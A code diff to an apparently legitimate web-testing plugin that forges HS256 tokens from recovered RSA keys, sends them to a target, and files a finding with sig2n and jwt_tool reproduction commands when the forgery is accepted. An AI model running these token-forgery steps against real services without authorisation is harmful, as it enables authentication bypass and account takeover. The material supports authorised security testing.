@@ -1886,7 +1886,7 @@ async function generateSpoofKeyPair(_sdk) {
   const jwks = buildJWKSDocument({ ...kp.publicJwk, kid: SPOOF_KID }, SPOOF_KID);
   return { privateKeyPem: kp.privateKeyPem, jwksJson: JSON.stringify(jwks, null, 2) };
 }
-async function runRecoveredConfusion(sdk, requestId, keys, sessionId) {
+async function runRecoveredConfusion(sdk, requestId, keys, sessionId, opts) {
   if (!keys.length) return { ok: false, count: 0, pems: [] };
   const pems = keys.map((k) => bigintToPublicKeyPem(BigInt("0x" + k.nHex), BigInt(k.e)));
   const reqResp = await sdk.requests.get(requestId);
@@ -1900,11 +1900,17 @@ async function runRecoveredConfusion(sdk, requestId, keys, sessionId) {
   const extra = buildAlgConfusionForKeys(parsed, pems, "recovered from HTTP history (frontend gmp-wasm)");
   for (const a of extra) if (!a.originalJWT) a.originalJWT = originalJWT;
   sdk.api.send("jwt-key-recovery-complete", { sessionId, keys: pems });
+  const bLen = opts?.baselineLength ?? 0;
+  const matchesBaseline = (a) => !!opts?.sigValidated && a.responseStatus !== void 0 && opts.baselineStatus !== void 0 && a.responseStatus === opts.baselineStatus && Math.abs((a.responseLength ?? 0) - bLen) <= Math.max(32, Math.floor(bLen * 0.05));
+  const jwt1 = opts?.candidateJwts?.[0] ?? "<JWT-token1>";
+  const jwt2 = opts?.candidateJwts?.[1] ?? "<JWT-token2>";
   for (const attack of extra) {
+    let sentReq;
     try {
       const attackSpec = cloneSpecWithJWT(spec, loc, attack.modifiedJWT);
       const start = Date.now();
       const sent = await sdk.requests.send(attackSpec);
+      sentReq = sent.request;
       attack.durationMs = Date.now() - start;
       attack.requestId = sent.request?.getId();
       if (sent.response) {
@@ -1919,6 +1925,31 @@ async function runRecoveredConfusion(sdk, requestId, keys, sessionId) {
       attack.error = e.message;
     }
     sdk.api.send("jwt-attack-result", { sessionId, result: attack });
+    if (sentReq && !attack.error && matchesBaseline(attack)) {
+      try {
+        const b64 = (attack.keyPem ?? "").replace(/-----[^-]+-----/g, "").replace(/\s+/g, "");
+        const title = "JWT algorithm confusion via recovered public key accepted";
+        await sdk.findings.create({
+          title,
+          reporter: "JWT Attacker",
+          dedupeKey: `jwt-attacker:recovered-confusion:${sentReq.getHost()}${sentReq.getPath()}`,
+          request: sentReq,
+          description: `**${title}.**
+
+The server's RSA public key was recovered from captured JWTs (silentsignal rsa_sign2n), then used as the HMAC secret to forge an HS256 token (algorithm confusion). The forged token was accepted: its response matched the baseline (HTTP ${attack.responseStatus}, ~${attack.responseLength} bytes), while a token with an invalid signature was rejected \u2014 confirming the bypass. Forged tokens with arbitrary claims would be accepted.
+
+**REPRODUCE WITH SIG2N and JWT_TOOL:**
+
+\`\`\`
+docker run --rm -it portswigger/sig2n ${jwt1} ${jwt2}
+echo -n ${b64} | base64 -d > /tmp/recoveredkey
+python3 jwt_tool.py ${originalJWT} -X k -pk /tmp/recoveredkey
+\`\`\``
+        });
+      } catch (e) {
+        sdk.console.log(`[JWT Attacker] recovered-confusion finding failed: ${e.message}`);
+      }
+    }
   }
   return { ok: true, count: extra.length, pems };
 }
